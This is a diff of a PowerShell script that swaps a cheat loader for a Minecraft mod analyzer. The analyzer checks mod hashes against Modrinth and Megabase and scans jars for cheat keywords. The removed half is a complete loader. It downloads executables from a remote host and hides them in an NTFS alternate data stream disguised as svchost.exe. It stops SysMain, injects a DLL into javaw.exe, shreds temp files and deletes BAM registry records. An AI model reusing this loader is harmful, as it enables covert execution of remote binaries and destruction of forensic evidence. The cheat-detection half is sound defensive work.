@@ -1,206 +1,259 @@
 Clear-Host
-function Show-Menu {
-    Clear-Host
-    Write-Host @"
- |\/\/\/|  
- |      |  
- |      |  
- | (o)(o)  
- C      _)  
-  | ,___|  
-  |   /    
- /____\    
-/      \ 
-"@
-    Write-Host "1. EXE Loader" -ForegroundColor Cyan
-    Write-Host "2. DLL Loader" -ForegroundColor Yellow
-    Write-Host "3. Exit" -ForegroundColor Red
+Write-Host "Habibi Mod Analyzer" -ForegroundColor Yellow
+Write-Host "Made by " -ForegroundColor DarkGray -NoNewline
+Write-Host "HadronCollision"
+Write-Host
+
+Write-Host "Enter path to the mods folder: " -NoNewline
+Write-Host "(press Enter to use default)" -ForegroundColor DarkGray
+$mods = Read-Host "PATH"
+Write-Host
+
+if (-not $mods) {
+    $mods = "$env:USERPROFILE\AppData\Roaming\.minecraft\mods"
+	Write-Host "Continuing with " -NoNewline
+	Write-Host $mods -ForegroundColor White
+	Write-Host
 }
 
-while ($true) {
-    Show-Menu
-    $choice = Read-Host "`nSelect an option (1/2/3)"
-
-function Rename-And-Delete {
-    param ([string]$filePath)
-    if (-not (Test-Path $filePath)) { Write-Host "    [!] File not found: $filePath" -ForegroundColor DarkRed; return }
-    $letters = 'A','B','C','D','E','F','G','H','I','J'
-    $dir = Split-Path $filePath
-    foreach ($letter in $letters) {
-        $namePart = $letter * 12
-        $extPart = $letter * 10
-        $newName = "$namePart.$extPart"
-        $newPath = Join-Path $dir $newName
-        try {
-            Rename-Item -Path $filePath -NewName $newName -Force -ErrorAction Stop
-            Write-Host "    [~] Renamed to: $newName" -ForegroundColor DarkYellow
-            $filePath = $newPath
-        } catch {
-            Write-Host "    [!] Failed to rename to $newName : $($_.Exception.Message)" -ForegroundColor Red
-            break
-        }
-    }
-
-    try {
-        Remove-Item -Path $filePath -Force -ErrorAction Stop
-        Write-Host "    [+] File deleted successfully" -ForegroundColor Green
-    } catch {
-        Write-Host "    [!] Failed to delete file: $($_.Exception.Message)" -ForegroundColor Red
-    }
+if (-not (Test-Path $mods -PathType Container)) {
+    Write-Host "Invalid Path!" -ForegroundColor Red
+    exit 1
 }
 
-function Remove-BamRegistryEntries {
-    param ([string]$adsName)
-    $basePath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
-    $found = $false
-    $removedCount = 0
-    Write-Host "`n[*] Scanning BAM registry for $adsName entries..." -ForegroundColor Cyan
+$process = Get-Process javaw -ErrorAction SilentlyContinue
+if (-not $process) {
+    $process = Get-Process java -ErrorAction SilentlyContinue
+}
+
+if ($process) {
     try {
-        $sids = Get-ChildItem -Path $basePath -ErrorAction Stop | Select-Object -ExpandProperty PSChildName
-        foreach ($sid in $sids) {
-            $fullPath="$basePath\$sid"
-            try {
-                $props=Get-ItemProperty -Path $fullPath -ErrorAction Stop
-                foreach ($prop in $props.PSObject.Properties) {
-                    $remove=$false
-                    if ($prop.Name.ToLower() -like "*$adsName*") { $remove=$true } else {
-                        try { $val=Get-ItemPropertyValue -Path $fullPath -Name $prop.Name -ErrorAction Stop; if ($val -and $val.ToString().ToLower() -like "*$adsName*") { $remove=$true } } catch {}
-                    }
-                    if ($remove) { Remove-ItemProperty -Path $fullPath -Name $prop.Name -Force -ErrorAction Stop; $found=$true; $removedCount++ }
-                }
-            } catch {}
-        }
-        if ($found) { Write-Host "[+] Removed BAM entries: $removedCount" -ForegroundColor Green } else { Write-Host "[*] No BAM entries found for $adsName" -ForegroundColor Cyan }
+        $startTime = $process.StartTime
+        $elapsedTime = (Get-Date) - $startTime
     } catch {}
+
+    Write-Host "{ Minecraft Uptime }" -ForegroundColor DarkCyan
+    Write-Host "$($process.Name) PID $($process.Id) started at $startTime and running for $($elapsedTime.Hours)h $($elapsedTime.Minutes)m $($elapsedTime.Seconds)s"
+    Write-Host ""
 }
 
-if ($choice -eq "1") {
-    Write-Host "`n[*] You selected EXE Loader`n" -ForegroundColor Cyan
-    $exeList = @(
-        @{ Name="akira clicker"; URL="https://abrehamrahi.ir/o/public/M5aNR94M/" },
-        @{ Name="exter"; URL="https://abrehamrahi.ir/o/public/P10LtTXg/" },
-        @{ Name="exelon"; URL="https://abrehamrahi.ir/o/public/ZodtylCU/" },
-        @{ Name="Enthapy"; URL="https://abrehamrahi.ir/o/public/CFrQnUvk/" }
+function Get-SHA1 {
+    param (
+        [string]$filePath
     )
-
-    Write-Host "Available EXE files:"
-    for ($i=0; $i -lt $exeList.Count; $i++) { Write-Host "$($i+1). $($exeList[$i].Name)" }
-    $exeChoice = Read-Host "`nSelect which EXE to download and run (1-$($exeList.Count))"
-    if ($exeChoice -notmatch "^[1-$($exeList.Count)]$") { Write-Host "[!] Invalid choice. Exiting..." -ForegroundColor Red; exit 1 }
-    $selectedExe = $exeList[$exeChoice - 1]
-    $rnd = -join ((48..57) | Get-Random -Count 4 | ForEach-Object {[char]$_})
-    $tempName = "$rnd.tmp"
-    $tempPath = Join-Path $env:TEMP $tempName
-    $exeUrl = $selectedExe.URL
-    $hostFile = "$env:TEMP\update.log"
-    $adsName = "svchost.exe"
-
-    Write-Host "[*] Downloading executable from $exeUrl" -ForegroundColor Cyan
-    Write-Host "    Destination: $tempPath"
-    try { Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -ErrorAction Stop; Write-Host "[+] Download completed successfully" -ForegroundColor Green } catch { Write-Host "[!] Download failed: $_" -ForegroundColor Red; exit 1 }
-
-    if (-not (Test-Path $hostFile)) { New-Item -Path $hostFile -ItemType File -Force | Out-Null; Write-Host "[+] Host file created: $hostFile" -ForegroundColor Green }
-
-    try { Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte; Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green } catch { Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red; exit 1 }
-
-    $tempExe = Join-Path $env:TEMP $adsName
-    try {
-        Get-Content "${hostFile}:${adsName}" -Encoding Byte -ReadCount 0 | Set-Content -Path $tempExe -Encoding Byte
-        Write-Host "[+] Executable extracted: $tempExe" -ForegroundColor Green
-        sc.exe stop SysMain | Out-Null; Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
-        Write-Host "[+] Wait...(15 secounds)" -ForegroundColor Green
-        Start-Sleep -Seconds 15
-        Start-Process $tempExe; Write-Host "[*] Process started: $tempExe" -ForegroundColor Cyan
-    } catch { Write-Host "[!] Failed to extract/execute file: $_" -ForegroundColor Red; exit 1 }
-
-    Write-Host "`n[*] Cleaning temporary files" -ForegroundColor Cyan
-    $deleteTmp = Read-Host "    Delete temporary files? [Y/N]"
-    if ($deleteTmp -match "^[Yy]$") {
-        $maxWait=30; $waited=0
-        while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) { Start-Sleep 1; $waited++ }
-        if (Test-Path $tempPath) { Rename-And-Delete -filePath $tempPath }
-        if (Test-Path $tempExe) { Rename-And-Delete -filePath $tempExe }
-    }
-    sc.exe start SysMain | Out-Null; Write-Host "[*] SysMain service started" -ForegroundColor Cyan
-    Remove-BamRegistryEntries -adsName "svchost.exe"
-    Write-Host "`n[+] EXE Loader operation completed" -ForegroundColor Green
-    Read-Host "`nPress Enter to return to menu"
+    return (Get-FileHash -Path $filePath -Algorithm SHA1).Hash
 }
 
+function Get-ZoneIdentifier {
+    param (
+        [string]$filePath
+    )
+	$ads = Get-Content -Raw -Stream Zone.Identifier $filePath -ErrorAction SilentlyContinue
+	if ($ads -match "HostUrl=(.+)") {
+		return $matches[1]
+	}
+	
+	return $null
+}
 
-elseif ($choice -eq "2") {
-    Write-Host "`n[*] You selected DLL Loader`n" -ForegroundColor Cyan
-    $dllLoaderUrl = "https://abrehamrahi.ir/o/public/MkVxqrPL/"
-    $rnd = -join ((48..57) | Get-Random -Count 4 | ForEach-Object {[char]$_})
-    $tempName = "$rnd.tmp"
-    $tempPath = Join-Path $env:TEMP $tempName
-    $hostFile = "$env:TEMP\update.log"
-    Write-Host "[*] Downloading DLL loader..." -ForegroundColor Cyan
-    Write-Host "    Destination: $tempPath"
+function Fetch-Modrinth {
+    param (
+        [string]$hash
+    )
     try {
-        Invoke-WebRequest -Uri $dllLoaderUrl -OutFile $tempPath -ErrorAction Stop
-        Write-Host "[+] Download completed successfully" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Download failed: $_" -ForegroundColor Red
-        exit 1
-    }
-    $userDllPath = Read-Host "Enter path to target DLL"
-    if (-not (Test-Path $userDllPath)) {
-        Write-Host "[!] DLL path not found: $userDllPath" -ForegroundColor Red
-        exit 1
-    }
-    $adsName = "svchost.exe"
-    if (-not (Test-Path $hostFile)) { New-Item -Path $hostFile -ItemType File -Force | Out-Null }
-    try {
-        Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte
-        Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red
-        exit 1
-    }
-    $tempExe = Join-Path $env:TEMP $adsName
-    try {
-        Get-Content "${hostFile}:${adsName}" -Encoding Byte -ReadCount 0 | Set-Content -Path $tempExe -Encoding Byte
-        Write-Host "[+] DLL loader extracted: $tempExe" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Failed to extract DLL loader: $_" -ForegroundColor Red
-        exit 1
-    }
-    sc.exe stop SysMain | Out-Null
-    Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
-    try {
-        $exeFolder = Split-Path $tempExe
-        Start-Process -FilePath $tempExe -ArgumentList "`"$userDllPath`" javaw.exe" -WorkingDirectory $exeFolder
-        Write-Host "[*] DLL Loader executed in its folder successfully" -ForegroundColor Cyan
-    } catch {
-        Write-Host "[!] Failed to execute DLL loader: $_" -ForegroundColor Red
-        exit 1
-    }
-    Write-Host "`n[*] Cleaning temporary files" -ForegroundColor Cyan
-    $deleteTmp = Read-Host "    Delete temporary files? [Y/N]"
-    if ($deleteTmp -match "^[Yy]$") {
-        $maxWait = 30
-        $waited = 0
-        while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) {
-            Start-Sleep 1
-            $waited++
+        $response = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/version_file/$hash" -Method Get -UseBasicParsing -ErrorAction Stop
+		if ($response.project_id) {
+            $projectResponse = "https://api.modrinth.com/v2/project/$($response.project_id)"
+            $projectData = Invoke-RestMethod -Uri $projectResponse -Method Get -UseBasicParsing -ErrorAction Stop
+            return @{ Name = $projectData.title; Slug = $projectData.slug }
         }
-        if (Test-Path $tempPath) { Rename-And-Delete -filePath $tempPath }
-        if (Test-Path $tempExe) { Rename-And-Delete -filePath $tempExe }
-    }
-    sc.exe start SysMain | Out-Null
-    Write-Host "[*] SysMain service started" -ForegroundColor Cyan
-    Remove-BamRegistryEntries -adsName "svchost.exe"
-    Write-Host "`n[+] DLL Loader operation completed" -ForegroundColor Green
-    Read-Host "`nPress Enter to return to menu"
-    
-    elseif ($choice -eq "3") {
-        Write-Host "`nExiting..." -ForegroundColor Red
-        break
-    }
-    else {
-        Write-Host "[!] Invalid choice. Try again..." -ForegroundColor Red
-        Start-Sleep -Seconds 2
-    }
+    } catch {}
+	
+    return @{ Name = ""; Slug = "" }
 }
+
+function Fetch-Megabase {
+    param (
+        [string]$hash
+    )
+    try {
+        $response = Invoke-RestMethod -Uri "https://megabase.vercel.app/api/query?hash=$hash" -Method Get -UseBasicParsing -ErrorAction Stop
+		if (-not $response.error) {
+			return $response.data
+		}
+    } catch {}
+	
+    return $null
+}
+
+$cheatStrings = @(
+	"AimAssist",
+	"AnchorTweaks",
+	"AutoAnchor",
+	"AutoCrystal",
+	"AutoAnchor",
+	"AutoDoubleHand",
+	"AutoHitCrystal",
+	"AutoPot",
+	"AutoTotem",
+	"AutoArmor",
+	"InventoryTotem",
+	"Hitboxes",
+	"JumpReset",
+	"LegitTotem",
+	"PingSpoof",
+	"SelfDestruct",
+	"ShieldBreaker",
+	"TriggerBot",
+	"Velocity",
+	"AxeSpam",
+	"WebMacro",
+	"SelfDestruct",
+	"FastPlace"
+)
+
+function Check-Strings {
+	param (
+        [string]$filePath
+    )
+	
+	$stringsFound = [System.Collections.Generic.HashSet[string]]::new()
+	
+	$fileContent = Get-Content -Raw $filePath
+	
+	foreach ($line in $fileContent) {
+		foreach ($string in $cheatStrings) {
+			if ($line -match $string) {
+				$stringsFound.Add($string) | Out-Null
+				continue
+			}
+		}
+	}
+	
+	return $stringsFound
+}
+
+
+$verifiedMods = @()
+$unknownMods = @()
+$cheatMods = @()
+
+$jarFiles = Get-ChildItem -Path $mods -Filter *.jar
+
+$spinner = @("|", "/", "-", "\")
+$totalMods = $jarFiles.Count
+$counter = 0
+
+foreach ($file in $jarFiles) {
+	$counter++
+	$spin = $spinner[$counter % $spinner.Length]
+	Write-Host "`r[$spin] Scanning mods: $counter / $totalMods" -ForegroundColor Yellow -NoNewline
+	
+	$hash = Get-SHA1 -filePath $file.FullName
+	
+    $modDataModrinth = Fetch-Modrinth -hash $hash
+    if ($modDataModrinth.Slug) {
+		$verifiedMods += [PSCustomObject]@{ ModName = $modDataModrinth.Name; FileName = $file.Name }
+		continue;
+    }
+	
+	$modDataMegabase = Fetch-Megabase -hash $hash
+	if ($modDataMegabase.name) {
+		$verifiedMods += [PSCustomObject]@{ ModName = $modDataMegabase.Name; FileName = $file.Name }
+		continue;
+	}
+	
+	$zoneId = Get-ZoneIdentifier $file.FullName
+	$unknownMods += [PSCustomObject]@{ FileName = $file.Name; FilePath = $file.FullName; ZoneId = $zoneId }
+}
+
+if ($unknownMods.Count -gt 0) {
+	$tempDir = Join-Path $env:TEMP "habibimodanalyzer"
+	
+	$counter = 0
+	
+	try {
+		if (Test-Path $tempDir) {
+			Remove-Item -Recurse -Force $tempDir
+		}
+		
+		New-Item -ItemType Directory -Path $tempDir | Out-Null
+		Add-Type -AssemblyName System.IO.Compression.FileSystem
+	
+		foreach ($mod in $unknownMods) {
+			$counter++
+			$spin = $spinner[$counter % $spinner.Length]
+			Write-Host "`r[$spin] Scanning unknown mods for cheat strings..." -ForegroundColor Yellow -NoNewline
+			
+			$modStrings = Check-Strings $mod.FilePath
+			if ($modStrings.Count -gt 0) {
+				$unknownMods = @($unknownMods | Where-Object -FilterScript {$_ -ne $mod})
+				$cheatMods += [PSCustomObject]@{ FileName = $mod.FileName; StringsFound = $modStrings }
+				continue
+			}
+			
+			$fileNameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($mod.FileName)
+			$extractPath = Join-Path $tempDir $fileNameWithoutExt
+			New-Item -ItemType Directory -Path $extractPath | Out-Null
+			
+			[System.IO.Compression.ZipFile]::ExtractToDirectory($mod.FilePath, $extractPath)
+			
+			$depJarsPath = Join-Path $extractPath "META-INF/jars"
+			if (-not $(Test-Path $depJarsPath)) {
+				continue
+			}
+			
+			$depJars = Get-ChildItem -Path $depJarsPath
+			foreach ($jar in $depJars) {
+				$depStrings = Check-Strings $jar.FullName
+				if (-not $depStrings) {
+					continue
+				}
+				$unknownMods = @($unknownMods | Where-Object -FilterScript {$_ -ne $mod})
+				$cheatMods += [PSCustomObject]@{ FileName = $mod.FileName; DepFileName = $jar.Name; StringsFound = $depStrings }
+			}
+			
+		}
+	} catch {
+		Write-Host "Error occured while scanning jar files! $($_.Exception.Message)" -ForegroundColor Red
+	} finally {
+		Remove-Item -Recurse -Force $tempDir
+	}
+}
+
+Write-Host "`r$(' ' * 80)`r" -NoNewline
+
+if ($verifiedMods.Count -gt 0) {
+	Write-Host "{ Verified Mods }" -ForegroundColor DarkCyan
+	foreach ($mod in $verifiedMods) {
+		Write-Host ("> {0, -30}" -f $mod.ModName) -ForegroundColor Green -NoNewline
+		Write-Host "$($mod.FileName)" -ForegroundColor Gray
+	}
+	Write-Host
+}
+
+if ($unknownMods.Count -gt 0) {
+	Write-Host "{ Unknown Mods }" -ForegroundColor DarkCyan
+	foreach ($mod in $unknownMods) {
+		if ($mod.ZoneId) {
+			Write-Host ("> {0, -30}" -f $mod.FileName) -ForegroundColor DarkYellow -NoNewline
+			Write-Host "$($mod.ZoneId)" -ForegroundColor DarkGray
+			continue
+		}
+		Write-Host "> $($mod.FileName)" -ForegroundColor DarkYellow
+	}
+	Write-Host
+}
+
+if ($cheatMods.Count -gt 0) {
+Write-Host "{ Cheat Mods }" -ForegroundColor DarkCyan
+	foreach ($mod in $cheatMods) {
+		Write-Host "> $($mod.FileName)" -ForegroundColor Red -NoNewline
+		if ($mod.DepFileName) {
+			Write-Host " ->" -ForegroundColor Gray -NoNewline
+			Write-Host " $($mod.DepFileName)" -ForegroundColor Red -NoNewline
+		}
+		Write-Host " [$($mod.StringsFound)]" -ForegroundColor DarkMagenta
+	}
+	Write-Host
 }
